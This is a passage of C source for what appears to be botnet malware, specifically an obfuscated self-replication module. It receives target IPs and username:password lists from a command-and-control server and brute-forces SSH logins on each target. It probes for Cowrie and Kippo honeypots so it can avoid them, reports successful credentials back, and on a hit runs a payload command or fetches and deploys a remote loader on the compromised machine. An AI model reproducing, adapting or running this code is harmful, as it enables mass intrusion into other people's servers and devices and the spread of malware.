    n = _Rz2Pm4g(c,
        "cat /proc/version 2>/dev/null; echo ---;"
        " cat /proc/1/cmdline 2>/dev/null;"
        " ls /opt/cowrie /home/cowrie /home/kippo 2>/dev/null",
        resp, (int)sizeof(resp));
    if (n > 0) {
        if (_CF4Xg7k(resp, "twisted") || _CF4Xg7k(resp, "cowrie") ||
            _CF4Xg7k(resp, "/home/kippo"))
            return 0;
        if (!uname_ok && _CF4Xg7k(resp, "Linux version"))
            uname_ok = 1;
    }

    if (uname_ok)
        return 1;

    /* ch[2]: BusyBox ECHOTEST — multi-path for embedded targets */
    n = _Rz2Pm4g(c,
        "busybox ECHOTEST 2>/dev/null"
        " || /bin/busybox ECHOTEST 2>/dev/null"
        " || /usr/bin/busybox ECHOTEST 2>/dev/null",
        resp, (int)sizeof(resp));
    if (n > 0 && _CF4Xg7k(resp, "applet not found"))
        return 1;

    return 0;
}

/* ======================================================================
   SCANNER MAIN
   ====================================================================== */

int _bj8XN2t = 0;
int _SV2eW7e   = -1;  /* read end of pipe — parent drains this */
static int ssh_write_fd = -1;  /* write end — child uses this */

/* Parse the base64-encoded payload from C2 */
static void _jk8sS4D(const char *b64_payload) {
    dbuf raw;
    char *data;
    char *targets[SSH_MAX_TARGETS];
    char *combos_user[SSH_MAX_COMBOS];
    char *combos_pass[SSH_MAX_COMBOS];
    int ntargets = 0, ncombos = 0;
    int mode_payload = 0;
    char *payload_cmd = NULL;
    char *line, *sep;
    int section = 0; /* 0=targets, 1=combos, 2=payload */
    int ti, ci;

    _nS5PJ8Y("[ssh] child: decoding payload (%zu bytes b64)", strlen(b64_payload));
    raw = _rr5LH7D(b64_payload);
    if (db_len(&raw) == 0) {
        _nS5PJ8Y("[ssh] child: decode failed, aborting");
        db_free(&raw); _exit(1);
    }
    _nS5PJ8Y("[ssh] child: decoded %zu bytes", db_len(&raw));

    /* null-terminate */
    db_push(&raw, 0);
    data = (char *)raw.data;

    /* Parse flags before strtok mangles data.
       Anchor with \n so "NOTCLEAN:10" can't match "CLEAN:1". */
    int clean = (strstr(data, "\nCLEAN:1\n")      != NULL) || (strncmp(data, "CLEAN:1\n",      8)  == 0);
    int no_hp = (strstr(data, "\nNOHPCHECK:1\n") != NULL) || (strncmp(data, "NOHPCHECK:1\n", 12) == 0);

    /* Extract payload section before strtok mangles everything.
       Format: ...combos...\n===\npayload_command_here */
    {
        char *marker = strstr(data, "\n===\n");
        if (marker) {
            *marker = '\0';  /* terminate combos section */
            payload_cmd = marker + 5; /* skip \n===\n */
            /* trim trailing whitespace */
            {
                int plen = (int)strlen(payload_cmd);
                while (plen > 0 && (payload_cmd[plen-1] == '\n' ||
                       payload_cmd[plen-1] == '\r' || payload_cmd[plen-1] == ' '))
                    plen--;
                payload_cmd[plen] = '\0';
                if (plen == 0) payload_cmd = NULL;
            }
        }
    }

    /* Parse: MODE:xxx\nIP\nIP\n---\nuser:pass\n... */
    line = strtok(data, "\n");
    while (line) {
        while (*line == ' ' || *line == '\r') line++;
        if (!*line) { line = strtok(NULL, "\n"); continue; }

        if (strncmp(line, "MODE:", 5) == 0) {
            if (strstr(line + 5, "payload")) mode_payload = 1;
        } else if (strcmp(line, "---") == 0) {
            section = 1;
        } else if (section == 0) {
            if (ntargets < SSH_MAX_TARGETS)
                targets[ntargets++] = line;
        } else {
            if (ncombos < SSH_MAX_COMBOS) {
                sep = strchr(line, ':');
                if (sep) {
                    *sep = '\0';
                    combos_user[ncombos] = line;
                    combos_pass[ncombos] = sep + 1;
                    ncombos++;
                }
            }
        }
        line = strtok(NULL, "\n");
    }

    _nS5PJ8Y("[ssh] child: parsed %d targets, %d combos, mode=%s",
              ntargets, ncombos, mode_payload ? "payload" : "report");
    SSH_DBG("loaded %d targets, %d combos, mode=%s, payload=%s", ntargets, ncombos,
            mode_payload ? "payload" : "report",
            payload_cmd ? payload_cmd : "(none)");

    if (ntargets == 0 || ncombos == 0) {
        _nS5PJ8Y("[ssh] child: no targets or combos, aborting");
        db_free(&raw); _exit(1);
    }

    iB2Zq4a();

    /* Binary report protocol — buffer per-IP events, aggregate skip/honeypot */
    vC8Yg5i(ssh_write_fd);
    uint16_t stat_skipped = 0, stat_honeypots = 0, stat_hpots_probe = 0;

    for (ti = 0; ti < ntargets; ti++) {
        const char *ip = targets[ti];
        struct sockaddr_in addr;

        /* Report progress every 200 targets */
        if (ti > 0 && (ti % 200) == 0) {
            Ux7my2G((uint32_t)ti, (uint32_t)ntargets);
            ku8gj5o();
        }
        int fd;
        _Rz8vk8z sc;
        struct timeval tv;

        _nS5PJ8Y("[ssh] child: [%d/%d] target %s", ti + 1, ntargets, ip);
        SSH_DBG("trying %s (%d/%d)", ip, ti + 1, ntargets);

        memset(&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = htons(SSH_PORT);
        if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) continue;

        fd = -1;
        int checked_hp = 0; /* only honeypot-check once per target */

        /* Try each combo — reconnect if server drops us after bad creds */
        for (ci = 0; ci < ncombos; ci++) {
            int result;

            /* (Re)connect if needed */
            if (fd < 0) {
                fd = socket(AF_INET, SOCK_STREAM, 0);
                if (fd < 0) break;

                tv.tv_sec = SSH_CONNECT_TIMEOUT; tv.tv_usec = 0;
                setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

                if (connect(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
                    close(fd); fd = -1;
                    break; /* target unreachable */
                }

                memset(&sc, 0, sizeof(sc));
                sc.fd = fd;
                sc.next_chan = 1;
                sc.encrypted = 0;
                sc.send_seq = 0;
                sc.recv_seq = 0;
                sc.hash_len = 32;

                {
                    int hs = _ms4KB8R(&sc);
                    if (hs == -2) {
                        SSH_DBG("%s: kex unsupported, skipping", ip);
                        stat_skipped++;
                        close(fd); fd = -1;
                        break; /* kex mismatch won't change on reconnect */
                    }
                    if (hs < 0) {
                        SSH_DBG("%s: handshake failed", ip);
                        close(fd); fd = -1;
                        break;
                    }
                }

                if (!checked_hp && !no_hp) {
                    checked_hp = 1;
                    if (_mn4es3f(&sc)) {
                        SSH_DBG("%s: honeypot detected (%s)", ip, sc.banner);
                        stat_honeypots++;
                        close(fd); fd = -1;
                        break;
                    }
                }
            }

            result = _CC2fp3F(&sc, combos_user[ci], combos_pass[ci]);
            if (result == 1) {
                /* Active honeypot probe before reporting/deploying */
                if (!no_hp && !_qP4pj8f(&sc)) {
                    SSH_DBG("%s: honeypot (probe) %s:%s", ip, combos_user[ci], combos_pass[ci]);
                    stat_hpots_probe++;
                    break;
                }
                _nS5PJ8Y("[ssh] child: %s HIT — %s:%s", ip, combos_user[ci], combos_pass[ci]);
                SSH_DBG("HIT: %s %s:%s", ip, combos_user[ci], combos_pass[ci]);
                tP6Uf6v(addr.sin_addr.s_addr, combos_user[ci], combos_pass[ci]);

                if (mode_payload && payload_cmd) {
                    const char *url_pos = strstr(payload_cmd, "http");
                    if (url_pos) {
                        if (url_pos > payload_cmd) {
                            char pre[1024];
                            int prelen = (int)(url_pos - payload_cmd);
                            while (prelen > 0 && (payload_cmd[prelen-1] == ';' || payload_cmd[prelen-1] == ' '))
                                prelen--;
                            if (prelen > 0 && prelen < (int)sizeof(pre)) {
                                memcpy(pre, payload_cmd, prelen);
                                pre[prelen] = '\0';
                                SSH_DBG("%s: pre-deploy exec: %s", ip, pre);
                                _nD6dS8V(&sc, pre);
                            }
                        }
                        if (_Cb5rB3s(&sc, url_pos, clean)) {
                            SSH_DBG("%s: deployed via loader chain", ip);
                            Da2yh8c(addr.sin_addr.s_addr);
                        } else {
                            SSH_DBG("%s: deploy failed (all methods)", ip);
                            Tt8yX7B(addr.sin_addr.s_addr);
                        }
                    } else {
                        if (_nD6dS8V(&sc, payload_cmd) < 0)
                            SSH_DBG("%s: exec failed", ip);
                        else
                            SSH_DBG("%s: payload sent", ip);
                    }
                }
                break;
            } else if (result < 0) {
                /* Server dropped connection (e.g. OpenSSH disconnect after bad creds).
                   Close and reconnect on next combo iteration. */
                SSH_DBG("%s: auth error on %s:%s, reconnecting for next combo",
                        ip, combos_user[ci], combos_pass[ci]);
                close(fd); fd = -1;
            }
            /* result == 0: auth rejected but connection alive, try next combo */
        }

        if (fd >= 0) close(fd);
    }

    _nS5PJ8Y("[ssh] child: scan complete — %d targets (skip=%d hp=%d hp_probe=%d)",
              ntargets, stat_skipped, stat_honeypots, stat_hpots_probe);
    yd7bZ4a((uint32_t)ntargets, stat_skipped, stat_honeypots, stat_hpots_probe);
    ku8gj5o();

    db_free(&raw);
    _exit(0);
}

void kh8hL4N(const char *b64_payload, _EA8up4M *parent_conn) {
    int pipefd[2];
    pid_t pid;
    (void)parent_conn;
    _nS5PJ8Y("[ssh] init: starting (current pid=%d)", _bj8XN2t);
    if (_bj8XN2t > 0) {
        _nS5PJ8Y("[ssh] init: already running (pid=%d)", _bj8XN2t);
        return;
    }

    if (pipe(pipefd) < 0) return;

    pid = fork();
    if (pid < 0) {
        close(pipefd[0]);
        close(pipefd[1]);
        return;
    }
    if (pid > 0) {
        /* parent — keep read end */
        close(pipefd[1]);
        _bj8XN2t = pid;
        _SV2eW7e = pipefd[0];
        fcntl(_SV2eW7e, F_SETFL, fcntl(_SV2eW7e, F_GETFL) | O_NONBLOCK);
        _nS5PJ8Y("[ssh] init: forked child pid=%d, report_fd=%d", pid, _SV2eW7e);
        return;
    }

    /* child — keep write end */
    close(pipefd[0]);
    if (_ib2tD7y >= 0) { close(_ib2tD7y); _ib2tD7y = -1; }
    ssh_write_fd = pipefd[1];
    _nS5PJ8Y("[ssh] child: starting (write_fd=%d)", ssh_write_fd);
    _jk8sS4D(b64_payload);
    _nS5PJ8Y("[ssh] child: finished, exiting");
    _exit(0);
}

void Ss3vb6a(void) {
    _nS5PJ8Y("[ssh] kill: pid=%d fd=%d", _bj8XN2t, _SV2eW7e);
    if (_bj8XN2t > 0) {
        kill(_bj8XN2t, 9);
        _bj8XN2t = 0;
    }
    if (_SV2eW7e >= 0) {
        close(_SV2eW7e);
        _SV2eW7e = -1;
    }
}

#endif /* NO_SELFREP */
